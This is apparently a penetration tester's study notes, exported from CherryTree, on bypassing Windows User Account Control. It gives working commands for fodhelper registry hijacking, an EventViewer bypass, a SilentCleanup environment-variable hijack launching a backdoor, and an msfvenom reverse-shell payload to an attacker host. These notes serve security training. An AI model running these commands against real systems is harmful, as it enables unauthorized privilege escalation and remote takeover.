<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>11- Bypass UAC</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>11- Bypass UAC</h1><br/><p><em><h2>Intro</h2></em><ul><li>User Account Control (UAC)</li><li>forces application to run in an non administrative context until an admin authorizes elevated access </li><li>goal: <ul><li> any application that wishes to perform an operation with a potential system-wide impact, cannot do so silently</li></ul></li><li>SCreens<ul><li></li></ul></li></ul><img src="images/229-1.png" alt="images/229-1.png" /><ul><li>in command: integrity level<ul><li></li></ul></li></ul><img src="images/229-2.png" alt="images/229-2.png" /><ul><li>Medium mandatory level</li><li>net user admin pass<ul><li>// denied error</li></ul></li></ul></p><p></p><p></p><p><em><h2>Bypass UAC</h2></em></p><p><ul><li>mETHOD #1 in GUI powershell.exe Start-Process powershell.exe -Verb runAs<ul><li>// witch to a high integrity level even if we are logged in with an administrative user</li><li>Mandatory Label\High Mandatory Level </li></ul></li><li>Method #2 in cmdline <ul><li><a href="https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1">https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1</a></li><li>msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=4444 -f exe &gt;shell.exe</li><li>start metepretyer listener </li><li>Invoke-EventViewer C:\Users\ted\Documents\temp\shell.exe</li></ul></li><li>METHOD #3<ul><li>fodhelper </li></ul></li></ul></p><p></p><p></p><p></p><p><em><h2>UAC bypasses</h2></em><ul><li>depend on the os </li><li>example fodhelper buypass <ul><li>REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command</li><li>REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ</li><li>REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d &quot;cmd.exe&quot; /f</li><li>// run fodhelper.exe</li></ul></li><li>metasploit</li></ul></p><p></p><p><em><h2>Overview</h2></em><ul><li>restricting permissions of the runing programs</li><li>responsible for popus when programs want to do stuff on your system</li><li>other features when:<ul><li>installing drivers</li><li>defragmenting a hard drive</li></ul></li><li>other features of UAC<ul><li>virtualization of folders to prevent protected folders from getting corrupted</li></ul></li></ul></p><p></p><p></p><p><em><h2>UAC bypass fodhelper</h2></em><ul><li>situation : we are member of administrator group , however we do not have high privilges as of now =&gt; we need to bypass UAC </li><li>Fodhelper is a auto-elevated executable, which is signed by Microsoft</li><li>This executable is vulnerable to class hijacking, it can be used to spawn our executable with High integrity level. We need to hijack the default value at &quot;HKCU\Software\Classes\ms-settings\shell\open\command‚Äù</li><li><a href="https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/uac/uacMethod2.py">https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/uac/uacMethod2.py</a><ul><li>use fodhelper to</li><li></li></ul></li></ul><img src="images/229-3.png" alt="images/229-3.png" /><ul><li>Command: Set-ItemProperty -Path&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value$command -Force</li><li>Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot; -WindowStyle Hidden</li></ul></p><p></p><p></p><p></p><p><em><h2>UAC bypass: silent cleanup</h2></em><ul><li>, we are going to use the SilentCleanup predefined scheduled task to bypassUAC. The task automatically runs with elevated privileges. When the task runs, it will executethe file %windir%\system32\cleanmgr.exe. The misconfiguration is that we can control theuser&#39;s environment variables i.e %windir% we can change it to execute a malicious executablethat would give us elevated privileges meterpreter session.</li><li>Commands$<ul><li>New-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value&quot;C:\Users\Student\AppData\Local\Temp\backdoor.exe /k anybinary.exe&quot; -PropertyTypeString -Force</li><li>schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</li></ul></li></ul></p></div>
</body>
</html>
